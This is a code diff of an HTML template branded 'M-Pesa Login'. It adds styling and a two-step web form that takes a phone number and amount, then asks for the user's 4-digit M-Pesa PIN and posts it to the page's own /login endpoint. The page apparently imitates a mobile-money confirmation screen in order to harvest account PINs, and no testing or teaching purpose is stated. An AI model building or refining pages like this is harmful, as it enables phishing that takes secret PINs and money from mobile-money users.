@@ -84,6 +84,11 @@
       background: #085d32;
     }
 
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
     .error {
       min-height: 22px;
       margin-top: 12px;
@@ -95,45 +100,190 @@
     .success {
       min-height: 22px;
       margin-top: 12px;
+      padding: 10px;
+      background-color: #e8f5e9;
       color: #0b7a3d;
       font-size: 14px;
       text-align: center;
+      border-radius: 8px;
+      border: 1px solid #0b7a3d;
+    }
+
+    .pin-message {
+      min-height: 22px;
+      margin-top: 12px;
+      padding: 10px;
+      background-color: #fff3cd;
+      color: #856404;
+      font-size: 14px;
+      text-align: center;
+      border-radius: 8px;
+      border: 1px solid #ffc107;
+      font-weight: 600;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .summary {
+      background-color: #f0f8f5;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      border-left: 4px solid #0b7a3d;
+    }
+
+    .summary-item {
+      margin: 4px 0;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .summary-label {
+      font-weight: 600;
+      color: #0b7a3d;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 8px;
+    }
+
+    .button-group button {
+      flex: 1;
+    }
+
+    .btn-back {
+      background: #6c757d;
+    }
+
+    .btn-back:hover {
+      background: #5a6268;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>M-Pesa Login</h2>
-    <p class="subtitle">Enter your details to continue securely.</p>
+    <p class="subtitle">Enter your details to complete the transaction.</p>
 
     <form method="POST" action="/login" novalidate>
-      <div class="field">
-        <label for="phone">Phone Number</label>
-        <input id="phone" name="phone" type="tel" placeholder="254712345678" value="{{ phone or '' }}" required />
+      <!-- Phone and Amount Section -->
+      <div id="phoneAmountSection">
+        <div class="field">
+          <label for="phone">Phone Number</label>
+          <input id="phone" name="phone" type="tel" placeholder="254712345678" value="{{ phone or '' }}" required />
+        </div>
+
+        <div class="field">
+          <label for="amount">Amount (Ksh)</label>
+          <input id="amount" name="amount" type="number" placeholder="Enter amount" value="{{ amount or '' }}" step="0.01" min="0.01" required />
+        </div>
+
+        <button type="submit" name="action" value="validate">Continue</button>
       </div>
 
-      <div class="field">
-        <label for="amount">Amount</label>
-        <input id="amount" name="amount" type="number" placeholder="Enter amount" value="{{ amount or '' }}" step="0.01" required />
+      <!-- PIN Section -->
+      <div id="pinSection" class="hidden">
+        <div class="summary">
+          <div class="summary-item">
+            <span class="summary-label">Phone:</span> {{ phone or '' }}
+          </div>
+          <div class="summary-item">
+            <span class="summary-label">Amount:</span> Ksh {{ amount or '' }}
+          </div>
+        </div>
+
+        <div class="pin-message">
+          💬 Please enter your M-Pesa PIN to confirm this transaction
+        </div>
+
+        <div class="field">
+          <label for="pin">M-Pesa PIN</label>
+          <input id="pin" name="pin" type="password" placeholder="Enter your 4-digit PIN" value="{{ pin or '' }}" maxlength="4" pattern="[0-9]{4}" required />
+        </div>
+
+        <button type="submit" name="action" value="confirm">Confirm PIN</button>
+        <button type="submit" name="action" value="back" class="btn-back">Back</button>
       </div>
 
-      {% if show_pin %}
-      <div class="field">
-        <label for="pin">M-Pesa PIN</label>
-        <input id="pin" name="pin" type="password" placeholder="Enter your 4-digit PIN" value="{{ pin or '' }}" maxlength="4" required />
-      </div>
-      {% endif %}
-
-      <button type="submit">{% if show_pin %}Confirm PIN{% else %}Continue{% endif %}</button>
-
+      <!-- Error Message -->
       {% if error %}
-      <p class="error">{{ error }}</p>
+      <p class="error">❌ {{ error }}</p>
       {% endif %}
 
+      <!-- Success Message -->
       {% if success %}
-      <p class="success">{{ success }}</p>
+      <p class="success">✓ {{ success }}</p>
       {% endif %}
     </form>
   </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const phoneAmountSection = document.getElementById('phoneAmountSection');
+      const pinSection = document.getElementById('pinSection');
+      const phone = document.getElementById('phone');
+      const amount = document.getElementById('amount');
+      const pin = document.getElementById('pin');
+      const form = document.querySelector('form');
+
+      // Check if we should show PIN section
+      const showPin = {{ 'true' if show_pin else 'false' }};
+      if (showPin) {
+        phoneAmountSection.classList.add('hidden');
+        pinSection.classList.remove('hidden');
+        pin.focus();
+      }
+
+      // Handle form submission
+      form.addEventListener('submit', function(e) {
+        const action = e.submitter.value;
+
+        if (action === 'validate') {
+          // Validate phone and amount on client side
+          const phoneValue = phone.value.trim();
+          const amountValue = amount.value.trim();
+
+          if (!phoneValue || !amountValue) {
+            e.preventDefault();
+            alert('Please enter both phone number and amount.');
+            return;
+          }
+
+          // Phone validation
+          if (!/^[0-9]{10,13}$/.test(phoneValue)) {
+            e.preventDefault();
+            alert('Please enter a valid phone number (10-13 digits).');
+            phone.focus();
+            return;
+          }
+
+          // Amount validation
+          if (isNaN(amountValue) || parseFloat(amountValue) <= 0) {
+            e.preventDefault();
+            alert('Please enter a valid amount greater than zero.');
+            amount.focus();
+            return;
+          }
+
+          // If validation passes, show PIN section
+          e.preventDefault();
+          phoneAmountSection.classList.add('hidden');
+          pinSection.classList.remove('hidden');
+          pin.focus();
+        } 
+        else if (action === 'back') {
+          // Go back to phone/amount section
+          e.preventDefault();
+          phoneAmountSection.classList.remove('hidden');
+          pinSection.classList.add('hidden');
+          phone.focus();
+        }
+        // If action is 'confirm', let the form submit normally
+      });
+    });
+  </script>
 </body>
 </html>
